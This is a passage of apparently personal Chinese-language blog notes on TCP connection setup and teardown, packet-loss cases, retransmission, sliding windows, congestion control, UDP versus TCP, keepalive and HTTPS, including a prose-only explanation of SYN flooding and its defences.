报文，那么服务器在收到请求后就会<strong>建立多个冗余的无效链接，造成不必要的资源浪费。</strong></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>TCP 建立连接时，通过三次握手<strong>能防止历史连接的建立，能减少双方不必要的资源开销，能帮助双方同步初始化序列号</strong>。序列号能够保证数据包不重复、不丢弃和按序传输。<br>不使用「两次握手」和「四次握手」的原因：</p><ul><li><p>「两次握手」：无法防止历史连接的建立，会造成双方资源的浪费，也无法可靠的同步双方序列号；</p></li><li><p>「四次握手」：三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。</p><h1 id="第一次握手丢失会发生什么"><a href="#第一次握手丢失会发生什么" class="headerlink" title="第一次握手丢失会发生什么"></a>第一次握手丢失会发生什么</h1><p>当客户端想和服务端建立 TCP 连接的时候，首先第一个发的就是 SYN 报文，然后进入到 SYN_SENT 状态。<br>在这之后，如果客户端迟迟收不到服务端的 SYN-ACK 报文（第二次握手），就会触发「超时重传」机制，重传 SYN 报文。<br>通常，第一次超时重传是在 1 秒后，第二次超时重传是在 2 秒，第三次超时重传是在 4 秒后，第四次超时重传是在 8 秒后，第五次是在超时重传 16 秒后。没错，<strong>每次超时的时间是上一次的 2 倍</strong>。</p><h1 id="第二次握手丢失会发生什么"><a href="#第二次握手丢失会发生什么" class="headerlink" title="第二次握手丢失会发生什么"></a>第二次握手丢失会发生什么</h1><p>当服务端收到客户端的第一次握手后，就会回 SYN-ACK 报文给客户端，这个就是第二次握手，此时服务端会进入 SYN_RCVD 状态。<br>第二次握手的 SYN-ACK 报文其实有两个目的 ：</p></li><li><p>第二次握手里的 ACK， 是对第一次握手的确认报文；</p></li><li><p>第二次握手里的 SYN，是服务端发起建立 TCP 连接的报文；</p></li></ul><p>因为第二次握手报文里是包含对客户端的第一次握手的 ACK 确认报文，所以，如果客户端迟迟没有收到第二次握手，那么客户端就觉得可能自己的 SYN 报文（第一次握手）丢失了，于是<strong>客户端就会触发超时重传机制，重传 SYN 报文</strong>。<br>然后，因为第二次握手中包含服务端的 SYN 报文，所以当客户端收到后，需要给服务端发送 ACK 确认报文（第三次握手），服务端才会认为该 SYN 报文被客户端收到了。<br>那么，如果第二次握手丢失了，服务端就收不到第三次握手，于是<strong>服务端这边会触发超时重传机制，重传 SYN-ACK 报文</strong>。</p><h1 id="第三次握手丢失会发生什么"><a href="#第三次握手丢失会发生什么" class="headerlink" title="第三次握手丢失会发生什么"></a>第三次握手丢失会发生什么</h1><p>客户端收到服务端的 SYN-ACK 报文后，就会给服务端回一个 ACK 报文，也就是第三次握手，此时客户端状态进入到 ESTABLISH 状态。<br>因为这个第三次握手的 ACK 是对第二次握手的 SYN 的确认报文，所以当第三次握手丢失了，如果服务端那一方迟迟收不到这个确认报文，就会触发超时重传机制，重传 SYN-ACK 报文，直到收到第三次握手，或者达到最大重传次数。<br>注意，<strong>ACK 报文是不会有重传的，当 ACK 丢失了，就由对方重传对应的报文</strong>。</p><h1 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a>SYN攻击</h1><p>攻击者短时间伪造不同 IP 地址的 SYN 报文，服务端每接收到一个 SYN 报文，就进入SYN_RCVD 状态，但服务端发送出去的 ACK + SYN 报文，无法得到未知 IP 主机的 ACK 应答，久而久之就会<strong>占满服务端的半连接队列</strong>，使得服务器不能为正常用户服务。<br>正常流程：</p><ul><li>当服务端接收到客户端的 SYN 报文时，会将其加入到内核的「 SYN 队列」；</li><li>接着发送 SYN + ACK 给客户端，等待客户端回应 ACK 报文；</li><li>服务端接收到 ACK 报文后，从「 SYN 队列」移除放入到「 Accept 队列」；</li><li>应用通过调用 accpet() socket 接口，从「 Accept 队列」取出连接。</li></ul><p><strong>避免方式：</strong></p><ol><li>修改 Linux 内核参数，控制队列大小和当队列满时应做什么处理</li><li>当 「 SYN 队列」满之后，后续服务器收到 SYN 包，不进入「 SYN 队列」，计算出一个 cookie 值，再以 SYN + ACK 中的「序列号」返回客户端。服务端接收到客户端的应答报文时，服务器会检查这个 ACK 包的合法性。如果合法，直接放入到「 Accept 队列」，最后应用通过调用 accpet() socket 接口，从「 Accept 队列」取出的连接。<h1 id="TCP-连接断开"><a href="#TCP-连接断开" class="headerlink" title="TCP 连接断开"></a>TCP 连接断开</h1>TCP 断开连接是通过<strong>四次挥手</strong>方式。<br>双方都可以主动断开连接，断开连接后主机中的「资源」将被释放，四次挥手的过程如下图：<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657458284824-44c6dbf7-9e4b-402e-bb97-47fab2391e3e.png"></li></ol><ul><li>客户端打算关闭连接，此时会发送一个 TCP 首部 FIN 标志位被置为 1 的报文，也即 FIN 报文，之后客户端进入 FIN_WAIT_1 状态。</li><li>服务端收到该报文后，就向客户端发送 ACK 应答报文，接着服务端进入 CLOSED_WAIT 状态。</li><li>客户端收到服务端的 ACK 应答报文后，之后进入 FIN_WAIT_2 状态。</li><li>等待服务端处理完数据后，也向客户端发送 FIN 报文，之后服务端进入 LAST_ACK 状态。</li><li>客户端收到服务端的 FIN 报文后，回一个 ACK 应答报文，之后进入 TIME_WAIT 状态</li><li>服务器收到了 ACK 应答报文后，就进入了 CLOSED 状态，至此服务端已经完成连接的关闭。</li><li>客户端在经过 2MSL 一段时间后，自动进入 CLOSED 状态，至此客户端也完成连接的关闭。</li></ul><p>每个方向都需要<strong>一个 FIN 和一个 ACK</strong>，因此通常被称为<strong>四次挥手</strong>。这里一点需要注意是：<strong>主动关闭连接的，才有 TIME_WAIT 状态。</strong></p><h2 id="为什么是四次"><a href="#为什么是四次" class="headerlink" title="为什么是四次"></a>为什么是四次</h2><ul><li>关闭连接时，客户端向服务端发送 FIN 时，仅仅表示客户端不再发送数据了但是还能接收数据。</li><li>服务器收到客户端的 FIN 报文时，先回一个 ACK 应答报文，而服务端可能还有数据需要处理和发送，等服务端不再发送数据时，才发送 FIN 报文给客户端来表示同意现在关闭连接。</li></ul><p>从上面过程可知，服务端通常需要等待完成数据的发送和处理，所以服务端的 ACK 和 FIN 一般都会分开发送，从而比三次握手导致多了一次。</p><h1 id="第一次挥手丢失会发生什么"><a href="#第一次挥手丢失会发生什么" class="headerlink" title="第一次挥手丢失会发生什么"></a>第一次挥手丢失会发生什么</h1><p>当客户端（主动关闭方）调用 close 函数后，就会向服务端发送 FIN 报文，试图与服务端断开连接，此时客户端的连接进入到 FIN_WAIT_1 状态。<br>正常情况下，如果能及时收到服务端（被动关闭方）的 ACK，则会很快变为 FIN_WAIT2状态。<br>如果第一次挥手丢失了，那么客户端迟迟收不到被动方的 ACK 的话，也就会触发超时重传机制，重传 FIN 报文，重发次数由 tcp_orphan_retries 参数控制。<br>当客户端重传 FIN 报文的次数超过 tcp_orphan_retries 后，就不再发送 FIN 报文，直接进入到 close 状态。</p><h1 id="第二次挥手丢失会发生什么"><a href="#第二次挥手丢失会发生什么" class="headerlink" title="第二次挥手丢失会发生什么"></a>第二次挥手丢失会发生什么</h1><p>当服务端收到客户端的第一次挥手后，就会先回一个 ACK 确认报文，此时服务端的连接进入到 CLOSE_WAIT 状态。<br>在前面我们也提了，<strong>ACK 报文是不会重传的</strong>，所以如果服务端的第二次挥手丢失了，客户端就会触发超时重传机制，重传 FIN 报文，直到收到服务端的第二次挥手，或者达到最大的重传次数。<br>当客户端收到第二次挥手，也就是收到服务端发送的 ACK 报文后，客户端就会处于 FIN_WAIT2 状态，在这个状态需要等服务端发送第三次挥手，也就是服务端的 FIN 报文。<br>对于 close 函数关闭的连接，由于无法再发送和接收数据，所以FIN_WAIT2 状态不可以持续太久，而 tcp_fin_timeout 控制了这个状态下连接的持续时长，默认值是 60 秒。<br>这意味着对于调用 close 关闭的连接，如果在 60 秒后还没有收到 FIN 报文，客户端（主动关闭方）的连接就会直接关闭。<br>但是注意，如果主动关闭方使用 shutdown 函数关闭连接且指定只关闭发送方向，而接收方向并没有关闭，那么意味着主动关闭方还是可以接收数据的。如果主动关闭方一直没收到第三次挥手，那么主动关闭方的连接将会一直处于 FIN_WAIT2 状态（tcp_fin_timeout 无法控制 shutdown 关闭的连接）。</p><h1 id="第三次挥手丢失会发生什么"><a href="#第三次挥手丢失会发生什么" class="headerlink" title="第三次挥手丢失会发生什么"></a>第三次挥手丢失会发生什么</h1><p>当服务端（被动关闭方）收到客户端（主动关闭方）的 FIN 报文后，内核会自动回复 ACK，同时连接处于 CLOSE_WAIT 状态，顾名思义，它表示等待应用进程调用 close 函数关闭连接。<br>此时，内核是没有权利替代进程关闭连接，必须由进程主动调用 close 函数来触发服务端发送 FIN 报文。<br>服务端处于 CLOSE_WAIT 状态时，调用了 close 函数，内核就会发出 FIN 报文，同时连接进入 LAST_ACK 状态，等待客户端返回 ACK 来确认连接关闭。<br>如果迟迟收不到这个 ACK，服务端就会重发 FIN 报文，重发次数仍然由 tcp_orphan_retries 参数控制，这与客户端重发 FIN 报文的重传次数控制方式是一样的。</p><h1 id="第四次挥手丢失会发生什么"><a href="#第四次挥手丢失会发生什么" class="headerlink" title="第四次挥手丢失会发生什么"></a>第四次挥手丢失会发生什么</h1><p>当客户端收到服务端的第三次挥手的 FIN 报文后，就会回 ACK 报文，也就是第四次挥手，此时客户端连接进入 TIME_WAIT 状态。<br>在 Linux 系统，TIME_WAIT 状态会持续 2MSL 后才会进入关闭状态。<br>然后，服务端（被动关闭方）没有收到 ACK 报文前，还是处于 LAST_ACK 状态。<br>如果第四次挥手的 ACK 报文没有到达服务端，服务端就会重发 FIN 报文，重发次数仍然由前面介绍过的 tcp_orphan_retries 参数控制。</p><h1 id="为什么-TIME-WAIT-等待的时间是-2MSL？"><a href="#为什么-TIME-WAIT-等待的时间是-2MSL？" class="headerlink" title="为什么 TIME_WAIT 等待的时间是 2MSL？"></a>为什么 TIME_WAIT 等待的时间是 2MSL？</h1><p>MSL 是 Maximum Segment Lifetime，<strong>报文最大生存时间</strong>，它是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。因为 TCP 报文基于是 IP 协议的，而 IP 头中有一个 TTL 字段，是 IP 数据报可以经过的最大路由数，每经过一个处理他的路由器此值就减 1，当此值为 0 则数据报将被丢弃，同时发送 ICMP 报文通知源主机。<br>可以看到 <strong>2MSL时长</strong> 这其实是相当于<strong>至少允许报文丢失一次</strong>。比如，若 ACK 在一个 MSL 内丢失，这样被动方重发的 FIN 会在第 2 个 MSL 内到达，TIME_WAIT 状态的连接可以应对。<br>为什么不是 4 或者 8 MSL 的时长呢？你可以想象一个丢包率达到百分之一的糟糕网络，连续两次丢包的概率只有万分之一，这个概率实在是太小了，忽略它比解决它更具性价比。<br>2MSL 的时间是从<strong>客户端接收到 FIN 后发送 ACK 开始计时的</strong>。如果在 TIME-WAIT 时间内，因为客户端的 ACK 没有传输到服务端，客户端又接收到了服务端重发的 FIN 报文，那么 <strong>2MSL 时间将重新计时</strong>。</p><h1 id="为什么要TIME-WAIT状态"><a href="#为什么要TIME-WAIT状态" class="headerlink" title="为什么要TIME_WAIT状态"></a>为什么要TIME_WAIT状态</h1><ul><li><p>防止历史连接中的数据，被后面相同四元组的连接错误的接收；</p></li><li><p>保证「被动关闭连接」的一方，能被正确的关闭；</p><h1 id="TCP为啥是可靠的"><a href="#TCP为啥是可靠的" class="headerlink" title="TCP为啥是可靠的"></a>TCP为啥是可靠的</h1><p>TCP 是一个可靠传输的协议，那它是如何保证可靠的呢？<br>为了实现可靠性传输，需要考虑很多事情，例如数据的破坏、丢包、重复以及分片顺序混乱等问题。如不能解决这些问题，也就无从谈起可靠传输。<br>那么，TCP 是通过<strong>序列号、确认应答、重发控制、连接管理以及窗口控制</strong>等机制实现可靠性传输的。</p><h2 id="重传机制"><a href="#重传机制" class="headerlink" title="重传机制"></a>重传机制</h2><p>TCP 实现可靠传输的方式之一，是通过序列号与确认应答。<br>在 TCP 中，当发送端的数据到达接收主机时，接收端主机会返回一个确认应答消息，表示已收到消息。<br>但在错综复杂的网络，并不一定能如上图那么顺利能正常的数据传输，万一数据在传输过程中丢失了呢？<br>所以 TCP 针对数据包丢失的情况，会用<strong>重传机制</strong>解决。</p><h3 id="超时重传"><a href="#超时重传" class="headerlink" title="超时重传"></a>超时重传</h3><p><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657459050264-9c22dcd5-b827-447f-b70a-6b00c0a159ea.jpeg"><br>上图中有两种超时时间不同的情况：</p></li><li><p>当超时时间 <strong>RTO 较大</strong>时，重发就慢，丢了老半天才重发，没有效率，性能差；</p></li><li><p>当超时时间 <strong>RTO 较小</strong>时，会导致可能并没有丢就重发，于是重发的就快，会增加网络拥塞，导致更多的超时，更多的超时导致更多的重发。</p></li></ul><p>精确的测量超时时间 RTO 的值是非常重要的，这可让我们的重传机制更高效。<br>根据上述的两种情况，我们可以得知，<strong>超时重传时间 RTO 的值应该略大于报文往返 RTT 的值</strong>。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657459073826-f018dd25-7288-47f9-82c0-07e4d02fd630.jpeg"></p><h3 id="快速重传"><a href="#快速重传" class="headerlink" title="快速重传"></a>快速重传</h3><p><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657459110193-082587bb-014e-4b8c-9032-cecf428a4887.jpeg"></p><ul><li>第一份 Seq1 先送到了，于是就 Ack 回 2；</li><li>结果 Seq2 因为某些原因没收到，Seq3 到达了，于是还是 Ack 回 2；</li><li>后面的 Seq4 和 Seq5 都到了，但还是 Ack 回 2，因为 Seq2 还是没有收到；</li><li><strong>发送端收到了三个 Ack = 2 的确认，知道了 Seq2 还没有收到，就会在定时器过期之前，重传丢失的 Seq2。</strong></li><li>最后，收到了 Seq2，此时因为 Seq3，Seq4，Seq5 都收到了，于是 Ack 回 6 。</li></ul><p>快速重传机制只解决了一个问题，就是超时时间的问题，但是它依然面临着另外一个问题。就是<strong>重传的时候，是重传之前的一个，还是重传所有的问题。</strong><br>比如对于上面的例子，是重传 Seq2 呢？还是重传 Seq2、Seq3、Seq4、Seq5 呢？因为发送端并不清楚这连续的三个 Ack 2 是谁传回来的。</p><h3 id="SACK选择性确认"><a href="#SACK选择性确认" class="headerlink" title="SACK选择性确认"></a>SACK选择性确认</h3><p>这种方式需要在 TCP 头部「选项」字段里加一个 SACK 的东西，它<strong>可以将缓存的地图发送给发送方</strong>，这样发送方就可以知道哪些数据收到了，哪些数据没收到，知道了这些信息，就可以<strong>只重传丢失的数据</strong>。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657459390363-dd685ad6-bd40-4ced-bdf8-3dc001dc1a70.jpeg"></p><h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><p>我们都知道 TCP 是每发送一个数据，都要进行一次确认应答。当上一个数据包收到了应答了， 再发送下一个。但这种方式的缺点是效率比较低的。<br>为解决这个问题，TCP 引入了<strong>窗口</strong>这个概念。即使在往返时间较长的情况下，它也不会降低网络通信的效率。<br>那么有了窗口，就可以指定窗口大小，窗口大小就是指<strong>无需等待确认应答，而可以继续发送数据的最大值</strong>。<br>窗口的实现实际上是操作系统开辟的一个<strong>缓存空间</strong>，发送方主机在等到确认应答返回之前，必须在缓冲区中保留已发送的数据。如果按期收到确认应答，此时数据就可以从缓存区清除。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657459480149-a3bdfb45-2815-4d33-801f-3692623051f4.jpeg"></p><ul><li>#1 是已发送并收到 ACK确认的数据：1~31 字节</li><li>#2 是已发送但未收到 ACK确认的数据：32~45 字节</li><li>#3 是未发送但总大小在接收方处理范围内（接收方还有空间）：46~51字节</li><li>#4 是未发送但总大小超过接收方处理范围（接收方没有空间）：52字节以后</li></ul><p>在下图，当收到之前发送的数据 32<del>36 字节的 ACK 确认应答后，如果发送窗口的大小没有变化，则<strong>滑动窗口往右边移动 5 个字节，因为有 5 个字节的数据被应答确认</strong>，接下来 52</del>56 字节又变成了可用窗口，那么后续也就可以发送 52~56 这 5 个字节的数据了。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657459524511-0327b0f3-4ed4-49a2-a8ac-2896c3549616.jpeg"><br>TCP 滑动窗口方案使用三个指针来跟踪在四个传输类别中的每一个类别中的字节。其中两个指针是绝对指针（指特定的序列号），一个是相对指针（需要做偏移）。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657459579804-e07d32e1-48d2-4dc9-8e66-b1e196ea55e2.jpeg"></p><h2 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h2><p>发送方不能无脑的发数据给接收方，要考虑接收方处理能力。<br>如果一直无脑的发数据给对方，但对方处理不过来，那么就会导致触发重发机制，从而导致网络流量的无端的浪费。<br>为了解决这种现象发生，<strong>TCP 提供一种机制可以让「发送方」根据「接收方」的实际接收能力控制发送的数据量，这就是所谓的流量控制。</strong></p><h2 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h2><p>一般来说，计算机网络都处在一个共享的环境。因此也有可能会因为其他主机之间的通信使得网络拥堵。<br><strong>在网络出现拥堵时，如果继续发送大量数据包，可能会导致数据包时延、丢失等，这时 TCP 就会重传数据，但是一重传就会导致网络的负担更重，于是会导致更大的延迟以及更多的丢包，这个情况就会进入恶性循环被不断地放大….</strong><br>所以，TCP 不能忽略网络上发生的事，它被设计成一个无私的协议，当网络发送拥塞时，TCP 会自我牺牲，降低发送的数据量。<br>于是，就有了<strong>拥塞控制</strong>，控制的目的就是<strong>避免「发送方」的数据填满整个网络。</strong><br>为了在「发送方」调节所要发送数据的量，定义了一个叫做「<strong>拥塞窗口</strong>」的概念。<br><strong>拥塞窗口 cwnd</strong>是发送方维护的一个的状态变量，它会根据<strong>网络的拥塞程度动态变化的</strong>。<br>我们在前面提到过发送窗口 swnd 和接收窗口 rwnd 是约等于的关系，那么由于加入了拥塞窗口的概念后，此时发送窗口的值是swnd = min(cwnd, rwnd)，也就是拥塞窗口和接收窗口中的最小值。<br>拥塞窗口 cwnd 变化的规则：</p><ul><li><p>只要网络中没有出现拥塞，cwnd 就会增大；</p></li><li><p>但网络中出现了拥塞，cwnd 就减少；</p><h3 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h3><p>TCP 在刚建立连接完成后，首先是有个慢启动的过程，这个慢启动的意思就是一点一点的提高发送数据包的数量，如果一上来就发大量的数据，这不是给网络添堵吗？<br>慢启动的算法记住一个规则就行：<strong>当发送方每收到一个 ACK，拥塞窗口 cwnd 的大小就会加 1。</strong><br>可以看出慢启动算法，发包的个数是<strong>指数性的增长</strong>。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657461768939-be8acba1-fd9f-45c4-a1c7-bb37f6e65332.jpeg"><br>有一个叫慢启动门限 ssthresh （slow start threshold)状态变量。</p></li><li><p>当 cwnd &lt; ssthresh 时，使用慢启动算法。</p></li><li><p>当 cwnd &gt;= ssthresh 时，就会使用「拥塞避免算法」。</p><h3 id="拥塞避免算法"><a href="#拥塞避免算法" class="headerlink" title="拥塞避免算法"></a>拥塞避免算法</h3><p>前面说道，当拥塞窗口 cwnd 「超过」慢启动门限 ssthresh 就会进入拥塞避免算法。<br>一般来说 ssthresh 的大小是 65535 字节。<br>那么进入拥塞避免算法后，它的规则是：<strong>每当收到一个 ACK 时，cwnd 增加 1/cwnd。</strong><br>接上前面的慢启动的栗子，现假定 ssthresh 为 8：</p></li><li><p>当 8 个 ACK 应答确认到来时，每个确认增加 1/8，8 个 ACK 确认 cwnd 一共增加 1，于是这一次能够发送 9 个 MSS 大小的数据，变成了<strong>线性增长。</strong></p></li></ul><p><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657461857410-a908980d-c4bb-496a-856c-5ec22b16afd1.jpeg"><br>所以，我们可以发现，拥塞避免算法就是将原本慢启动算法的指数增长变成了线性增长，还是增长阶段，但是增长速度缓慢了一些。<br>就这么一直增长着后，网络就会慢慢进入了拥塞的状况了，于是就会出现丢包现象，这时就需要对丢失的数据包进行重传。</p><h3 id="拥塞发生"><a href="#拥塞发生" class="headerlink" title="拥塞发生"></a>拥塞发生</h3><p>当网络出现拥塞，也就是会发生数据包重传，重传机制主要有两种：</p><ul><li>超时重传</li><li>快速重传</li></ul><p>当发生了「<strong>超时重传</strong>」，则就会使用拥塞发生算法。<br>这个时候，ssthresh 和 cwnd 的值会发生变化：</p><ul><li>ssthresh 设为 cwnd/2，</li><li>cwnd 重置为 1 （是恢复为 cwnd 初始化值，我这里假定 cwnd 初始化值 1）</li></ul><p><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657462092168-b3c9f1b3-e086-4a17-a736-5c53ca236143.jpeg"></p><h3 id="快速恢复"><a href="#快速恢复" class="headerlink" title="快速恢复"></a>快速恢复</h3><p><strong>快速重传</strong>和快速恢复算法一般同时使用，快速恢复算法是认为，你还能收到 3 个重复 ACK 说明网络也不那么糟糕，所以没有必要像 RTO 超时那么强烈。<br>正如前面所说，进入快速恢复之前，cwnd 和 ssthresh 已被更新了：</p><ul><li>cwnd = cwnd/2 ，也就是设置为原来的一半;</li><li>ssthresh = cwnd;</li></ul><p>然后，进入快速恢复算法如下：</p><ul><li>拥塞窗口 cwnd = ssthresh + 3 （ 3 的意思是确认有 3 个数据包被收到了）；</li><li>重传丢失的数据包；</li><li>如果再收到重复的 ACK，那么 cwnd 增加 1；</li><li>如果收到新数据的 ACK 后，把 cwnd 设置为第一步中的 ssthresh 的值，原因是该 ACK 确认了新的数据，说明从 duplicated ACK 时的数据都已收到，该恢复过程已经结束，可以回到恢复之前的状态了，也即再次进入拥塞避免状态；</li></ul><p><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657463742741-743bc69f-3471-4d92-b5f9-81dbc70de2b4.png"></p><h1 id="UDP-TCP？"><a href="#UDP-TCP？" class="headerlink" title="UDP TCP？"></a>UDP TCP？</h1><ul><li>UDP是<strong>无连接的</strong>；</li><li>UDP使用<strong>尽最大努力交付</strong>，即不保证可靠交付，因此主机不需要维持复杂的链接状态（这里面有许多参数）；</li><li>UDP是<strong>面向报文</strong>的；</li><li>UDP<strong>没有拥塞控制</strong>，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）；</li><li>UDP<strong>支持一对一、一对多、多对一和多对多</strong>的交互通信；</li><li>UDP的<strong>首部开销小</strong>，只有8个字节，比TCP的20个字节的首部要短。</li></ul><p>那么，再说一次TCP的特点：</p><ul><li><p><strong>TCP是面向连接的</strong>。（就好像打电话一样，通话前需要先拨号建立连接，通话结束后要挂机释放连接）；</p></li><li><p>每一条TCP连接只能有两个端点，每一条TCP连接只能是点对点的（<strong>一对一</strong>）；</p></li><li><p>TCP<strong>提供可靠交付的服务</strong>。通过TCP连接传送的数据，无差错、不丢失、不重复、并且按序到达；</p></li><li><p>TCP<strong>提供全双工通信</strong>。TCP允许通信双方的应用进程在任何时候都能发送数据。TCP连接的两端都设有发送缓存和接收缓存，用来临时存放双方通信的数据；</p></li><li><p><strong>面向字节流</strong>。TCP中的“流”（stream）指的是流入进程或从进程流出的字节序列。“面向字节流”的含义是：虽然应用程序和TCP的交互是一次一个数据块（大小不等），但TCP把应用程序交下来的数据仅仅看成是一连串的无结构的字节流。</p><h1 id="TCP-Keepalive-和-HTTP-Keep-Alive"><a href="#TCP-Keepalive-和-HTTP-Keep-Alive" class="headerlink" title="TCP Keepalive 和 HTTP Keep-Alive"></a>TCP Keepalive 和 HTTP Keep-Alive</h1><p>事实上，<strong>这两个完全是两样不同东西</strong>，实现的层面也不同：</p></li><li><p>HTTP 的 Keep-Alive，是由<strong>应用层（用户态）</strong> 实现的，称为 HTTP 长连接；</p></li><li><p>TCP 的 Keepalive，是由 <strong>TCP 层（内核态）</strong> 实现的，称为 TCP 保活机制；</p><h2 id="HTTP-的-Keep-Alive"><a href="#HTTP-的-Keep-Alive" class="headerlink" title="HTTP 的 Keep-Alive"></a>HTTP 的 Keep-Alive</h2><table><thead><tr><th>Http 1.0 短链接</th><th>Http 1.1 长链接</th></tr></thead><tbody><tr><td><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657504730983-89ddfecf-3f13-4bb8-a93e-7fbbf55b8962.png" alt="image.png"></td><td><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657504758881-a72157de-0634-4dba-bc58-8c4d849f9b27.png" alt="image.png"></td></tr></tbody></table></li></ul><p>HTTP 的 Keep-Alive 可以使用同一个 TCP 连接来发送和接收多个 HTTP 请求/应答，避免了连接建立和释放的开销，这个方法称为 <strong>HTTP 长连接</strong>。<br><strong>从 HTTP 1.1 开始， 就默认是开启了 Keep-Alive。</strong><br>为了避免资源浪费的情况，web 服务软件一般都会提供 keepalive_timeout 参数，用来指定 HTTP 长连接的超时时间。比如设置了 HTTP 长连接的超时时间是 60 秒，web 服务软件就会<strong>启动一个定时器</strong>，如果客户端在完后一个 HTTP 请求后，在 60 秒内都没有再发起新的请求，<strong>定时器的时间一到，就会触发回调函数来释放该连接。</strong></p><h2 id="TCP-的-Keepalive"><a href="#TCP-的-Keepalive" class="headerlink" title="TCP 的 Keepalive"></a>TCP 的 Keepalive</h2><p>如果两端的 TCP 连接一直没有数据交互，达到了触发 TCP 保活机制的条件，那么内核里的 TCP 协议栈就会发送探测报文。</p><ul><li>如果对端程序是正常工作的。当 TCP 保活的探测报文发送给对端, 对端会正常响应，这样 <strong>TCP 保活时间会被重置</strong>，等待下一个 TCP 保活时间的到来。</li><li>如果对端主机崩溃，或对端由于其他原因导致报文不可达。当 TCP 保活的探测报文发送给对端后，石沉大海，没有响应，连续几次，达到保活探测次数后，<strong>TCP 会报告该 TCP 连接已经死亡</strong>。</li></ul><p>所以，TCP 保活机制可以在双方没有数据交互的情况，通过探测报文，来确定对方的 TCP 连接是否存活，这个工作是在内核完成的。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657504965949-5cc5a087-49f6-48c7-98c9-2b53bc20b534.png" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>HTTP 的 Keep-Alive 也叫 HTTP 长连接，该功能是由「应用程序」实现的，可以使得用同一个 TCP 连接来发送和接收多个 HTTP 请求/应答，减少了 HTTP 短连接带来的多次 TCP 连接建立和释放的开销。</li><li>TCP 的 Keepalive 也叫 TCP 保活机制，该功能是由「内核」实现的，当客户端和服务端长达一定时间没有进行数据交互时，内核为了确保该连接是否还有效，就会发送探测报文，来检测对方是否还在线，然后来决定是否要关闭该连接。<h1 id="HTTP-与-HTTPS"><a href="#HTTP-与-HTTPS" class="headerlink" title="HTTP 与 HTTPS"></a>HTTP 与 HTTPS</h1><h2 id="HTTP-与-HTTPS-区别"><a href="#HTTP-与-HTTPS-区别" class="headerlink" title="HTTP 与 HTTPS 区别"></a>HTTP 与 HTTPS 区别</h2></li></ul><ol><li>HTTP 是超文本传输协议，信息是明文传输，存在安全风险的问题。HTTPS 则解决 HTTP 不安全的缺陷，在 TCP 和 HTTP 网络层之间加入了 SSL/TLS 安全协议，使得报文能够加密传输。</li><li>HTTP 连接建立相对简单， TCP 三次握手之后便可进行 HTTP 的报文传输。而 HTTPS 在 TCP 三次握手之后，还需进行 SSL/TLS 的握手过程，才可进入加密报文传输。</li><li>HTTP 的端口号是 80，HTTPS 的端口号是 443。</li><li>HTTPS 协议需要向 CA（证书权威机构）申请数字证书，来保证服务器的身份是可信的。</li></ol><p>HTTP 由于是明文传输，所以安全上存在以下三个风险：</p><ul><li><strong>窃听风险</strong>，比如通信链路上可以获取通信内容，用户号容易没。</li><li><strong>篡改风险</strong>，比如强制植入垃圾广告，视觉污染，用户眼容易瞎。</li><li><strong>冒充风险</strong>，比如冒充淘宝网站，用户钱容易没。</li></ul><p><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657505887909-c7ca431c-dec5-47ff-8ced-20c8fa0fc250.png"><br>HTTPS 在 HTTP 与 TCP 层之间加入了 SSL/TLS 协议，可以很好的解决了上述的风险：</p><ul><li><p><strong>信息加密</strong>：交互信息无法被窃取，但你的号会因为「自身忘记」账号而没。</p></li><li><p><strong>校验机制</strong>：无法篡改通信内容，篡改了就不能正常显示，但百度「竞价排名」依然可以搜索垃圾广告。</p></li><li><p><strong>身份证书</strong>：证明淘宝是真的淘宝网，但你的钱还是会因为「剁手」而没。</p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2></li><li><p><strong>混合加密</strong>的方式实现信息的<strong>机密性</strong>，解决了窃听的风险。</p></li><li><p><strong>摘要算法</strong>的方式来实现<strong>完整性</strong>，它能够为数据生成独一无二的「指纹」，指纹用于校验数据的完整性，解决了篡改的风险。</p></li><li><p>将服务器公钥放入到<strong>数字证书</strong>中，解决了冒充的风险。</p><h3 id="混合加密"><a href="#混合加密" class="headerlink" 